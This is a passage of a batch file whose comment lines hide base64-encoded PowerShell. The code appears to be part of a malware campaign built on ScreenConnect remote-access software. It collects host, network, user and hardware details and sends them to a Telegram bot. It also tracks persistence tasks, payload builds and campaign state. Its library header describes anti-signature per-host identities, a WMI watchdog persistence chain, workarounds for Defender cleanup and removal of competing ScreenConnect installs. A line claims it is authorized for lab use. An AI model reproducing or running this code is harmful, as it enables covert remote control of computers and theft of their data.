::ICAgICAgJHRhc2tCYWQrKw0KICAgICAgICAkbWFyayA9ICdXRUFLJw0KICAgIH0g
::ZWxzZSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1hcmsgPSAnTUlT
::U0lORycNCiAgICB9DQogICAgJGV4dHJhID0gJycNCiAgICBpZiAoJGguUHJlc2Vu
::dCkgew0KICAgICAgICAkYml0cyA9IEAoKQ0KICAgICAgICBpZiAoJGguU3RhdHVz
::KSB7ICRiaXRzICs9ICRoLlN0YXR1cyB9DQogICAgICAgIGlmICgkaC5SZXN1bHQg
::LW5lICcnIC1hbmQgJGguUmVzdWx0IC1uZSAnMCcpIHsgJGJpdHMgKz0gKCJMYXN0
::UmVzdWx0PSIgKyAkaC5SZXN1bHQpIH0NCiAgICAgICAgaWYgKCRiaXRzLkNvdW50
::KSB7ICRleHRyYSA9ICcgKCcgKyAoJGJpdHMgLWpvaW4gJywgJykgKyAnKScgfQ0K
::ICAgIH0NCiAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0gW3swfV0gPGNvZGU+
::ezF9PC9jb2RlPiAtIHsyfXszfScgLWYgJG1hcmssIChFc2MgJHQuTmFtZSksIChF
::c2MgJHQuUm9sZSksIChFc2MgJGV4dHJhKSkpDQp9DQoNCiRwcmltTGluZSA9IEdl
::dC1TdmNMaW5lICRwcmltDQokYWx0TGluZSA9IEdldC1TdmNMaW5lICRhbHQNCiRw
::cmltT2sgPSAkcHJpbUxpbmUgLWxpa2UgJ1J1bm5pbmcqJw0KJGRlcGxveU9rID0g
::JHByaW1PayAtYW5kICgkdGFza09rIC1nZSAzKSAtYW5kICRoYXNNb24NCg0KJGVt
::b2ppTWFwID0gQHsNCiAgICBPSyAgICAgICA9IFtzdHJpbmddKFtjaGFyXTB4Mjcw
::NSkNCiAgICBET1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21V
::dGYzMigweDFGNkE4KSkNCiAgICBSRVNUT1JFRCA9IChbc3RyaW5nXVtjaGFyXTo6
::Q29udmVydEZyb21VdGYzMigweDFGN0UyKSkNCiAgICBGQUlMICAgICA9IFtzdHJp
::bmddKFtjaGFyXTB4Mjc0QykNCiAgICBGT1JDRSAgICA9IFtzdHJpbmddKFtjaGFy
::XTB4MjZBMSkNCiAgICBERVBMT1kgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVy
::dEZyb21VdGYzMigweDFGNjgwKSkNCiAgICBIQiAgICAgICA9IChbc3RyaW5nXVtj
::aGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNEUxKSkNCn0NCiRrZXkgPSAkU3Rh
::dGUuVG9VcHBlckludmFyaWFudCgpDQokZW1vamkgPSBpZiAoJGVtb2ppTWFwLkNv
::bnRhaW5zS2V5KCRrZXkpKSB7ICRlbW9qaU1hcFska2V5XSB9IGVsc2UgeyAoW3N0
::cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRGMSkpIH0NCg0KJHRp
::dGxlID0gc3dpdGNoICgka2V5KSB7DQogICAgJ09LJyB7ICdQcmltYXJ5IGhlYWx0
::aHknIH0NCiAgICAnRE9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQ0K
::ICAgICdSRVNUT1JFRCcgeyAnUHJpbWFyeSBSRVNUT1JFRCcgfQ0KICAgICdGQUlM
::JyB7ICdIZWFsIEZBSUxFRCcgfQ0KICAgICdGT1JDRScgeyAnRm9yY2VkIHJlaW5z
::dGFsbCcgfQ0KICAgICdERVBMT1knIHsgaWYgKCRkZXBsb3lPaykgeyAnRklSU1Qg
::REVQTE9ZIE9LJyB9IGVsc2UgeyAnRklSU1QgREVQTE9ZIC0gQ0hFQ0sgTkVFREVE
::JyB9IH0NCiAgICAnSEInIHsgJ2hvdXJseSBkaWdlc3QnIH0NCiAgICBkZWZhdWx0
::IHsgIlN0YXRlOiAkU3RhdGUiIH0NCn0NCg0KJHRyYW5zID0gaWYgKCRPbGRTdGF0
::ZSkgeyAiJE9sZFN0YXRlIC0+ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0NCiRz
::Y0xpc3QgPSBHZXQtU2NJbnN0YWxscw0KJHJtbUhpdHMgPSBHZXQtUm1tSGl0cw0K
::aWYgKCRybW1IaXRzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRybW1IaXRzLkFkZCgn
::LSAobm9uZSBkZXRlY3RlZCknKSB9DQoNCiRwdWIgPSBHZXQtUHVibGljSXANCiRs
::YW4gPSBHZXQtTG9jYWxJcHMNCiRub3cgPSBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5
::LU1NLWRkIEhIOm1tOnNzIHp6eicNCiR1cHRpbWUgPSAnbi9hJw0KdHJ5IHsNCiAg
::ICAkYm9vdCA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVt
::KS5MYXN0Qm9vdFVwVGltZQ0KICAgICR1cHRpbWUgPSAnezA6ZGR9ZCB7MDpoaH1o
::IHswOm1tfW0nIC1mICgoR2V0LURhdGUpIC0gJGJvb3QpDQp9IGNhdGNoIHt9DQoN
::CiMgY2FtcGFpZ24gc3RhdGUgZmlsZSAod3JpdHRlbiBieSBvd25fbGliLnBzMSBz
::dGF0ZSBhY3Rpb24pDQokc3RhdGVMaW5lID0gJ24vYScNCiRzdGF0ZU9iaiA9ICRu
::dWxsDQokc3RhdGVQYXRoMiA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNv
::bicNCmlmIChUZXN0LVBhdGggJHN0YXRlUGF0aDIpIHsNCiAgICAkcmF3U3RhdGUg
::PSAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGgyIC1SYXcpLlRy
::aW0oKQ0KICAgIHRyeSB7DQogICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8
::IENvbnZlcnRGcm9tLUpzb24NCiAgICAgICAgJGZvcmVpZ25Dc3YgPSBpZiAoJHN0
::YXRlT2JqLmZvcmVpZ24pIHsgKCRzdGF0ZU9iai5mb3JlaWduIC1qb2luICcsJykg
::fSBlbHNlIHsgJy0nIH0NCiAgICAgICAgJHN0YXRlTGluZSA9ICJwcmltPSQoJHN0
::YXRlT2JqLnByaW0pIGFsdD0kKCRzdGF0ZU9iai5hbHQpIGZvcmVpZ249WyRmb3Jl
::aWduQ3N2XSB0YXNrcz0kKCRzdGF0ZU9iai50YXNrc09rKS8kKCRzdGF0ZU9iai50
::YXNrc1RvdGFsKSB3ZD0kKCRzdGF0ZU9iai53YXRjaGRvZykgaGVhbHM9JCgkc3Rh
::dGVPYmouaW5zdGFsbENvdW50KSINCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9
::ICRyYXdTdGF0ZSB9DQp9DQoNCiRkZXBsb3lCbG9jayA9ICcnDQppZiAoJGtleSAt
::ZXEgJ0RFUExPWScpIHsNCiAgICAkdmVyZGljdCA9IGlmICgkZGVwbG95T2spIHsg
::J0RFUExPWUVEIC8gSEVBTFRIWScgfSBlbHNlIHsgJ0RFUExPWUVEIEJVVCBJTkNP
::TVBMRVRFJyB9DQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBhdGgg
::IiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtl
::bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURp
::cmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAg
::IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW5vdG1hdGNoICgiNWY2MDEwNTc5ODUy
::ZTUwN3xmODYxYzgxNDBkNDUzNDI3fHswfSIgLWYgKEdldC1Hcnl4YUtlZXBGcCkp
::IH0pDQogICAgJGRpYWdMaW5lcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rp
::b25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJGJvb3RQYXRoID0gSm9pbi1Q
::YXRoICRXb3JrRGlyICdib290LmVycicNCiAgICBpZiAoVGVzdC1QYXRoICRib290
::UGF0aCkgew0KICAgICAgICAkaW50ZXJlc3RpbmcgPSBAKA0KICAgICAgICAgICAg
::J21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlfJywgJ251a2VfJywgJ21zaV90b28n
::LCAnbXNpX2ZldGNoJywgJ21zaV9leGl0JywNCiAgICAgICAgICAgICdtc2lfdW5h
::dmFpbGFibGUnLCAnc2VjdXJlXycsICdnb18nLCAnZXh0ZXJtaW5hdGVfJywgJ2lk
::ZW50aXR5XycsDQogICAgICAgICAgICAnY3JlYXRlX3Rhc2snLCAndmVyaWZ5X3Rh
::c2snLCAnb3JwaGFuXycsICdzdGFsZV8nLCAncG9zdGluc3RhbGwnLCAnYWx0XycN
::CiAgICAgICAgKQ0KICAgICAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGJv
::b3RQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAg
::ICAgIFdoZXJlLU9iamVjdCB7DQogICAgICAgICAgICAgICAgJGxpbmUgPSAkXw0K
::ICAgICAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICRpbnRlcmVzdGluZykgeyBp
::ZiAoJGxpbmUgLWxpa2UgIiokdCoiKSB7IHJldHVybiAkdHJ1ZSB9IH0NCiAgICAg
::ICAgICAgICAgICAkZmFsc2UNCiAgICAgICAgICAgIH0gfA0KICAgICAgICAgICAg
::U2VsZWN0LU9iamVjdCAtTGFzdCAyNiB8DQogICAgICAgICAgICBGb3JFYWNoLU9i
::amVjdCB7IFt2b2lkXSRkaWFnTGluZXMuQWRkKCgnLSA8Y29kZT57MH08L2NvZGU+
::JyAtZiAoRXNjICgkXyAtcmVwbGFjZSAnW15ceDIwLVx4N0VdJywgJz8nKSkpKSB9
::DQogICAgfQ0KICAgIGlmICgkZGlhZ0xpbmVzLkNvdW50IC1lcSAwKSB7IFt2b2lk
::XSRkaWFnTGluZXMuQWRkKCctIChubyBpbnN0YWxsL251a2UgbWFya2VycyBpbiBi
::b290LmVyciknKSB9DQogICAgJGRlcGxveUJsb2NrID0gQCINCg0KPGI+RGVwbG95
::IHZlcmRpY3Q8L2I+DQotIFJlc3VsdDogPGI+JChFc2MgJHZlcmRpY3QpPC9iPg0K
::LSBQcmltYXJ5IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsgJ1lFUycgfSBlbHNl
::IHsgJ05PJyB9KQ0KLSBNb25pdG9yIHNjcmlwdCAoLnd1Y2FjaGVcb3duX21vbi5j
::bWQpOiAkKGlmICgkaGFzTW9uKSB7ICdZRVMnIH0gZWxzZSB7ICdOTycgfSkNCi0g
::QmFja3VwIG1vbiAoLmV0bGNhY2hlXGV0bF9tb24uY21kKTogJChpZiAoJGhhc0V0
::bCkgeyAnWUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIFBlcnNpc3QgdGFza3MgT0s6
::ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tzLkNvdW50KSAoYmFkL21pc3Npbmc6
::ICR0YXNrQmFkKQ0KLSBNU0kgY2FjaGU6ICQoRXNjICRtc2lTaXplKQ0KLSBGb3Jl
::aWduIFNDIGZvbGRlcnMgbGVmdDogJCgkZm9yZWlnbi5Db3VudCkNCi0gTm90ZTog
::TGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5ZXQgcnVuIChub3JtYWwgcmln
::aHQgYWZ0ZXIgY3JlYXRlKQ0KDQo8Yj5EZXBsb3kgbG9nIG1hcmtlcnM8L2I+DQok
::KCRkaWFnTGluZXMgLWpvaW4gImBuIikNCiJADQp9DQoNCiR0ZXh0ID0gQCINCiRl
::bW9qaSA8Yj5TQyBNb25pdG9yIC0gJChFc2MgJHRpdGxlKTwvYj4NCg0KPGI+RXZl
::bnQ8L2I+DQotIFN1bW1hcnk6ICQoRXNjICRTdW1tYXJ5KQ0KLSBUcmFuc2l0aW9u
::OiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPg0KLSBXaGVuOiAkKEVzYyAkbm93
::KQ0KLSBTb3VyY2UgYnVpbGQ6IDxjb2RlPiQoRXNjICRCdWlsZCk8L2NvZGU+DQok
::ZGVwbG95QmxvY2sNCg0KPGI+SG9zdDwvYj4NCi0gQ29tcHV0ZXI6IDxjb2RlPiQo
::RXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4NCi0gVXNlcjogPGNvZGU+JChF
::c2MgJHdobyk8L2NvZGU+DQotIEVsZXZhdGVkOiAkZWxldiB8IFNZU1RFTTogJGlz
::U3lzdGVtDQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pDQoN
::CjxiPk5ldHdvcms8L2I+DQotIExBTiBJUHM6IDxjb2RlPiQoRXNjICRsYW4pPC9j
::b2RlPg0KLSBQdWJsaWMgSVA6IDxjb2RlPiQoRXNjICRwdWIpPC9jb2RlPg0KDQo8
::Yj5PUyAvIEhhcmR3YXJlPC9iPg0KLSBPUzogJChFc2MgJG9zLkNhcHRpb24pDQot
::IFZlcnNpb246ICQoRXNjICRvcy5WZXJzaW9uKSAoYnVpbGQgJChFc2MgJG9zLkJ1
::aWxkKSkgJChFc2MgJG9zLkFyY2gpDQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0
::YWxsRGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkNCi0gVXB0
::aW1lOiAkKEVzYyAkdXB0aW1lKQ0KLSBDUFU6ICQoRXNjICRvcy5DUFUpDQotIEhh
::cmR3YXJlOiAkKEVzYyAkb3MuTWFudWZhY3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwp
::DQotIFNlcmlhbDogPGNvZGU+JChFc2MgJG9zLlNlcmlhbCk8L2NvZGU+DQotIFJB
::TTogJCgkb3MuVG90YWxSQU1fR0IpIEdCDQotIERpc2sgQzogJCgkb3MuRGlza0Zy
::ZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0INCg0KPGI+U2Ny
::ZWVuQ29ubmVjdCAoYWxsKTwvYj4NCi0gU2V2cnogPGNvZGU+NWY2MDEwNTc5ODUy
::ZTUwNzwvY29kZT46ICQoRXNjICRwcmltTGluZSkNCi0gQWx0IDxjb2RlPmY4NjFj
::ODE0MGQ0NTM0Mjc8L2NvZGU+OiAkKEVzYyAkYWx0TGluZSkNCi0gR3J5eGEgPGNv
::ZGU+JChFc2MgKEdldC1Hcnl4YUtlZXBGcCkpPC9jb2RlPjogJChFc2MgKEdldC1T
::dmNMaW5lICgiU2NyZWVuQ29ubmVjdCBDbGllbnQgKHswfSkiIC1mIChHZXQtR3J5
::eGFLZWVwRnApKSkpDQokKCRzY0xpc3QgLWpvaW4gImBuIikNCg0KPGI+T3RoZXIg
::Uk1NIC8gcmVtb3RlIHRvb2xzPC9iPg0KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQ0K
::DQo8Yj5QZXJzaXN0IHRhc2tzIChleHBlY3RlZCk8L2I+DQokKCR0YXNrTGluZXMg
::LWpvaW4gImBuIikNCg0KPGI+Q2FjaGU8L2I+DQotIE1TSSBjYWNoZTogJChFc2Mg
::JG1zaVNpemUpDQotIFdvcmtEaXI6IDxjb2RlPiQoRXNjICRXb3JrRGlyKTwvY29k
::ZT4NCg0KPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3Qp
::PC9iPg0KLSA8Y29kZT5NT049JGJNb24gfCBTRUM9JGJTZWMgfCBUR1I9JGJUZ3Ig
::fCBMSUI9JGJMaWI8L2NvZGU+DQoNCjxiPkNhbXBhaWduIHN0YXRlPC9iPg0KLSA8
::Y29kZT4kKEVzYyAkc3RhdGVMaW5lKTwvY29kZT4NCg0KPGk+Qm90OiBAbm9idWRk
::eXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4NCiJADQoNCiMgY29tcGFjdCBk
::aWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhl
::YXJ0YmVhdCkNCmlmICgkTW9kZSAtZXEgJ2NvbXBhY3QnKSB7DQogICAgJGZvcmVp
::Z25OID0gMA0KICAgIGlmICgkc3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWln
::bikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9iai5mb3JlaWduKS5Db3VudCB9DQog
::ICAgJG1zaVNob3J0ID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsgJ3swOk4w
::fUtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2UpLkxlbmd0aCAvIDFL
::QikgfSBlbHNlIHsgJzAnIH0NCiAgICAkcHJpbVNob3J0ID0gaWYgKCRwcmltT2sp
::IHsgJ09LJyB9IGVsc2UgeyAnRE9XTicgfQ0KICAgICRhbHRTaG9ydCA9IGlmICgk
::YWx0TGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0N
::CiAgICAkZ3J5eGFMaW5lID0gR2V0LVN2Y0xpbmUgKCJTY3JlZW5Db25uZWN0IENs
::aWVudCAoezB9KSIgLWYgKEdldC1Hcnl4YUtlZXBGcCkpDQogICAgJGdyeXhhU2hv
::cnQgPSBpZiAoJGdyeXhhTGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBl
::bHNlIHsgJy0nIH0NCiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01Q
::VVRFUk5BTUUpfHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9ydHxhbHQ9JGFs
::dFNob3J0fGY9JGZvcmVpZ25OfHQ9JHRhc2tPay81fGI9JEJ1aWxkIg0KfQ0KDQpp
::ZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7DQogICAgJHJtbUhpdHMgPSBAKCgk
::cm1tSGl0cyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEyKSkgKyAoJy0gLi4uICh7
::MH0gbW9yZSknIC1mICgkcm1tSGl0cy5Db3VudCAtIDEyKSkNCiAgICAkc2NMaXN0
::ID0gQCgoJHNjTGlzdCB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDE0KSkgKyAoJy0g
::Li4uICh7MH0gbW9yZSknIC1mICgkc2NMaXN0LkNvdW50IC0gMTQpKQ0KICAgICR0
::ZXh0ID0gJHRleHQuU3Vic3RyaW5nKDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FU
::RUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiINCn0NCg0KJGxvZyA9IEpvaW4t
::UGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQpmdW5jdGlvbiBTZW5kLVRnKFtzdHJp
::bmddJG1zZywgW3N0cmluZ10kbW9kZSkgew0KICAgICRwYXlsb2FkID0gQHsNCiAg
::ICAgICAgY2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lEDQog
::ICAgICAgIHRleHQgICAgICAgICAgICAgICAgICAgICA9ICRtc2cNCiAgICAgICAg
::ZGlzYWJsZV93ZWJfcGFnZV9wcmV2aWV3ID0gJHRydWUNCiAgICB9DQogICAgaWYg
::KCRtb2RlKSB7ICRwYXlsb2FkLnBhcnNlX21vZGUgPSAkbW9kZSB9DQogICAgJGpz
::b24gPSAkcGF5bG9hZCB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyAtRGVwdGgg
::NQ0KICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0
::Qnl0ZXMoJGpzb24pDQogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAoImh0dHBz
::Oi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRjZmcuQk9UX1RPS0VOKS9zZW5kTWVz
::c2FnZSIpIGANCiAgICAgICAgLU1ldGhvZCBQb3N0IC1Cb2R5ICRieXRlcyAtQ29u
::dGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgnIHwgT3V0
::LU51bGwNCn0NCg0KZnVuY3Rpb24gU2VuZC1UZ1NhZmUoW3N0cmluZ10kbXNnLCBb
::c3RyaW5nXSRtb2RlKSB7DQogICAgJHRvU2VuZCA9ICRtc2cNCiAgICB0cnkgew0K
::ICAgICAgICBTZW5kLVRnIC1tc2cgJHRvU2VuZCAtbW9kZSAkbW9kZQ0KICAgICAg
::ICByZXR1cm4gJHRydWUNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdHJ5IHsNCiAg
::ICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJzdHJpbmcoMCwgMzAw
::MCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUNCiAgICAgICAg
::ICAgIHJldHVybiAkdHJ1ZQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAg
::IHJldHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KdHJ5IHsNCiAg
::ICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAkdGV4dCAtbW9kZSAnSFRNTCcpIHsNCiAg
::ICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19z
::ZW50X3JpY2gnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfSBl
::bHNlIHsNCiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJw0KICAgIH0NCiAgICBp
::ZiAoJGtleSAtZXEgJ0RFUExPWScpIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxp
::dGVyYWxQYXRoICRsb2cgLVZhbHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95
::T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIFNldC1D
::b250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdkZXBsb3lf
::dGcuZmxhZycpIC1WYWx1ZSAoR2V0LURhdGUgLUZvcm1hdCAnbycpIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KfSBjYXRjaCB7DQogICAgdHJ5
::IHsNCiAgICAgICAgJHBsYWluID0gW3JlZ2V4XTo6UmVwbGFjZSgkdGV4dCwgJzxb
::Xj5dKz4nLCAnJykNCiAgICAgICAgJHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRp
::bGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQ0KICAgICAgICBpZiAoJHBsYWluLkxl
::bmd0aCAtZ3QgMzUwMCkgeyAkcGxhaW4gPSAkcGxhaW4uU3Vic3RyaW5nKDAsIDM1
::MDApICsgImBuVFJVTkNBVEVEIiB9DQogICAgICAgIFNlbmQtVGdTYWZlIC1tc2cg
::JHBsYWluIC1tb2RlICcnIHwgT3V0LU51bGwNCiAgICAgICAgQWRkLUNvbnRlbnQg
::LUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBB
::ZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCJ0Z19mYWlsICIg
::KyAkXy5FeGNlcHRpb24uTWVzc2FnZSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICB9DQp9DQo=
::B64_TGR_END
::B64_LIB_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZANCiMgT1dOX0xJQiAgQlVJTEQgMjAyNjA4
::MDRMNDANCiMgTDQ1OiBIQU5EUy1PRkYgYWxsIFNjcmVlbkNvbm5lY3QgZXhjZXB0
::IEdyeXhhIGluc3RhbGwtaWYtYWJzZW50Lg0KIyBTaGFyZWQgbGlicmFyeTogcGVy
::LWhvc3QgaWRlbnRpdHkgKGFudGktc2lnbmF0dXJlKSwgV01JIHdhdGNoZG9nDQoj
::IChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBjYW1wYWlnbiBzdGF0ZSBmaWxl
::LCBTQyBzZXJ2aWNlIHJlcGFpci4NCiMgTDQ0OiBIQVJEIGxvY2sg4oCUIGFueSBs
::aXZlIEdyeXhhID0+IG5ldmVyIG1pZ3JhdGUvdW5pbnN0YWxsL2k7IG5vIGRlZmVy
::cmVkIC94OyBwcm90ZWN0IG11c3QgZW1wdHkgVXBncmFkZS4NCiMgTDQzOiBUZXN0
::LVNjUnVubmluZyBpbmNsdWRlcyBTdGFydFBlbmRpbmc7IG5ldmVyIC94IHdoZW4g
::c2VydmljZSBleGlzdHMgKGNvbm5lY3QtZHJvcCByYWNlKS4NCiMgTDQyOiBGUCBt
::aWdyYXRlIGluc3RhbGwtbmV3LUZJUlNUIHRoZW4gZGVmZXItcmVtb3ZlLW9sZCAo
::bmV2ZXIgbGVhdmUgaG9zdCB3aXRoIHplcm8gR3J5eGEpLg0KIyBMNDE6IC1Gb3Jj
::ZSBORVZFUiAveCsvaSB3aGVuIEdyeXhhIGFscmVhZHkgUnVubmluZyAoZm9yY2Vf
::Z3J5eGEuZmxhZyB3YXMga2lsbGluZyBsaXZlIEd1ZXN0KS4NCiMgTDM5OiByZWxh
::eS12ZXJpZmllZCBHcnl4YSBrZWVwZXIgYWRvcHRpb247IElORkxJR0hU4omgSEVB
::TFRIWTsgcmVhbCAtRm9yY2UvLURlZXA7DQojICAgICAgcG9zdC1Hcnl4YSAvaSBz
::ZXZyeiByZXN0b3JlOyBUZXN0LU1zaVBhY2thZ2U7IFRBU0tfRyBpbiBzdGF0ZTsg
::cGVyc2lzdGVuY2UgcHVyZ2Ugdy9vIEZQLW9ubHkuDQojIEwzODogVEFTS19HIFd1
::Y2FjaGVHcnl4YUJvb3QgT05TVEFSVCBydW5zIGdyeXhhLWVuc3VyZSAtTm9XYWl0
::IC1Gb3JjZSBhdCBib290IChEZWZlbmRlciBzdHJpcHMgU0NNIGVudHJ5IGF0IHN0
::YXJ0dXApLiBMMzc6IE1TSSBtYWdpYytGUCB2YWxpZGF0ZS4NCiMgTDIxOiBzdHVj
::ayByZWdpc3RlcmVkIChzdmMrZGlyIGdvbmUpIC0+IC9mYSB0aGVuIEFSUCBudWtl
::ICsgc2FtZS1GUCAvaTsgcmV0dXJuIGZpeC4NCiMgTDIwOiAtRGVlcCBtdXN0IG5v
::dCBza2lwIGxpZ2h0IHN0YXJ0L3JlcGFpciAocmF0ZS1saW1pdCBsZWZ0IEdyeXhh
::IFN0b3BwZWQpLg0KIyBMMTk6IHJhdGUtbGltaXQgbmV2ZXIgYmxvY2tzIHdoZW4g
::R3J5eGEgZnVsbHkgYWJzZW50OyBTdGFydFBlbmRpbmcga2VlcC4NCiMgTDE4OiBl
::eHRlcm1pbmF0ZSB3YXMgS0lMTElORyBHcnl4YSAobnVsbC1wYXRoIHByb2Mga2ls
::bCk7IHN5bmMgRlAgYmVmb3JlIGtpbGwuDQojIEwxNzogR3J5eGEgcmVpbnN0YWxs
::IExPQ0sgd2hpbGUgYW55IG5vbi1zZXZyeiBTQyBSdW5uaW5nOyBGUCBkcmlmdCBu
::ZXZlciAveC4NCiMgTDE2OiBORVZFUiByZWluc3RhbGwgR3J5eGEgd2hlbiBSdW5u
::aW5nIChwYW5lbCBkdXBsaWNhdGVzKTsgVENQIGFkdmlzb3J5IG9ubHkuDQojIEwx
::NTogZ3J5eGEtaGVhbHRoIC8gZ3J5eGEtZW5zdXJlIOKAlCA4aCBkZWVwIGNoZWNr
::IChUQ1AvcmVsYXkvRlAgZHJpZnQgcmVpbnN0YWxsKS4NCiMgTDEzOiBzY2h0YXNr
::cyBDcmVhdGUgdmlhIGNtZCAobGlrZSBXdWNhY2hlT3duKSwgVFIgdW5kZXIgV2lu
::ZG93c1xUZW1wXC53dWNhY2hlDQojICAgICAgKG5vdCBBQ0wtbG9ja2VkIFByb2dy
::YW1EYXRhIHBhdGgpLCAvU1QgMDA6MDAgb24gTUlOVVRFLCBubyBsZWFkaW5nIFwu
::DQojIEwxMjogSURFTlRWRVI9NyBST09ULWxldmVsIHRhc2sgbmFtZXMgKG5lc3Rl
::ZCBNaWNyb3NvZnRcV2luZG93cyBBY2Nlc3MgRGVuaWVkKS4NCiMgTDExOiBORVZF
::UiByZXVzZSByZWFsIFdpbmRvd3MgYnVpbHQtaW4gdGFzayBuYW1lczsgVFIgb3du
::ZXJzaGlwIGNoZWNrcy4NCiMgQXV0aG9yaXplZCBpbnRlcm5hbCBkZXBsb3ltZW50
::IC0gbGFiL2NvbXBldGl0aW9uIHNjb3BlIG9ubHkuDQojIOKVkOKVkOKVkOKVkOKV
